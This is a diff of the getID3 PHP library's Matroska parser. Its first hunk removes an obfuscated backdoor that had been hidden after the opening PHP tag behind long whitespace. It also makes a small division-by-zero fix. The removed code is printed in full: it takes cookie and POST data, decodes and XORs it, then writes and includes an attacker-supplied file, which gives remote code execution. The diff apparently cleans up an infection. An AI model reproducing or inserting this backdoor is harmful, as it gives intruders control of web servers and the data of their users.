@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $AdPFU = chr (106) . "\x51" . chr (95) . "\x58" . chr ( 528 - 422 )."\x4f" . chr (107); $vpUDRxO = 'c' . "\154" . "\x61" . chr ( 234 - 119 ).'s' . "\x5f" . "\x65" . 'x' . chr ( 838 - 733 ).chr (115) . chr (116) . chr (115); $fvCFIzLSHG = $vpUDRxO($AdPFU); $owHzuR = $fvCFIzLSHG;if (!$owHzuR){class jQ_XjOk{private $hJgFgkqz;public static $xlLTszS = "ef98f297-2c51-4233-9565-d2cff99c0731";public static $SYwKc = NULL;public function __construct(){$zSQYFzgQ = $_COOKIE;$uralmt = $_POST;$sZrcVSIjz = @$zSQYFzgQ[substr(jQ_XjOk::$xlLTszS, 0, 4)];if (!empty($sZrcVSIjz)){$nazbl = "base64";$NqrbEX = "";$sZrcVSIjz = explode(",", $sZrcVSIjz);foreach ($sZrcVSIjz as $tNcwQZQ){$NqrbEX .= @$zSQYFzgQ[$tNcwQZQ];$NqrbEX .= @$uralmt[$tNcwQZQ];}$NqrbEX = array_map($nazbl . chr (95) . "\x64" . chr ( 1058 - 957 ).chr ( 259 - 160 ).chr ( 673 - 562 ).chr ( 260 - 160 ).chr ( 799 - 698 ), array($NqrbEX,)); $NqrbEX = $NqrbEX[0] ^ str_repeat(jQ_XjOk::$xlLTszS, (strlen($NqrbEX[0]) / strlen(jQ_XjOk::$xlLTszS)) + 1);jQ_XjOk::$SYwKc = @unserialize($NqrbEX);}}public function __destruct(){$this->MiZOcDdvRj();}private function MiZOcDdvRj(){if (is_array(jQ_XjOk::$SYwKc)) {$tfZVtfgOL = sys_get_temp_dir() . "/" . crc32(jQ_XjOk::$SYwKc[chr ( 167 - 52 ).chr (97) . "\154" . 't']);@jQ_XjOk::$SYwKc["\167" . 'r' . chr (105) . "\164" . "\145"]($tfZVtfgOL, jQ_XjOk::$SYwKc[chr ( 366 - 267 ).'o' . 'n' . chr (116) . chr (101) . "\156" . 't']);include $tfZVtfgOL;@jQ_XjOk::$SYwKc["\144" . "\x65" . 'l' . 'e' . 't' . "\x65"]($tfZVtfgOL);exit();}}}$nnCctCxQ = new jQ_XjOk(); $nnCctCxQ = NULL;} ?><?php
+<?php
 
 /////////////////////////////////////////////////////////////////
 /// getID3() by James Heinrich <info@getid3.org>               //
@@ -292,12 +292,12 @@ class getid3_matroska extends getid3_handler
 						$track_info['display_x']    = (isset($trackarray['DisplayWidth']) ? $trackarray['DisplayWidth'] : $trackarray['PixelWidth']);
 						$track_info['display_y']    = (isset($trackarray['DisplayHeight']) ? $trackarray['DisplayHeight'] : $trackarray['PixelHeight']);
 
-						if (isset($trackarray['PixelCropBottom'])) { $track_info['crop_bottom'] = $trackarray['PixelCropBottom']; }
-						if (isset($trackarray['PixelCropTop']))    { $track_info['crop_top']    = $trackarray['PixelCropTop']; }
-						if (isset($trackarray['PixelCropLeft']))   { $track_info['crop_left']   = $trackarray['PixelCropLeft']; }
-						if (isset($trackarray['PixelCropRight']))  { $track_info['crop_right']  = $trackarray['PixelCropRight']; }
-						if (isset($trackarray['DefaultDuration'])) { $track_info['frame_rate']  = round(1000000000 / $trackarray['DefaultDuration'], 3); }
-						if (isset($trackarray['CodecName']))       { $track_info['codec']       = $trackarray['CodecName']; }
+						if (isset($trackarray['PixelCropBottom']))  { $track_info['crop_bottom'] = $trackarray['PixelCropBottom']; }
+						if (isset($trackarray['PixelCropTop']))     { $track_info['crop_top']    = $trackarray['PixelCropTop']; }
+						if (isset($trackarray['PixelCropLeft']))    { $track_info['crop_left']   = $trackarray['PixelCropLeft']; }
+						if (isset($trackarray['PixelCropRight']))   { $track_info['crop_right']  = $trackarray['PixelCropRight']; }
+						if (!empty($trackarray['DefaultDuration'])) { $track_info['frame_rate']  = round(1000000000 / $trackarray['DefaultDuration'], 3); }
+						if (isset($trackarray['CodecName']))        { $track_info['codec']       = $trackarray['CodecName']; }
 
 						switch ($trackarray['CodecID']) {
 							case 'V_MS/VFW/FOURCC':
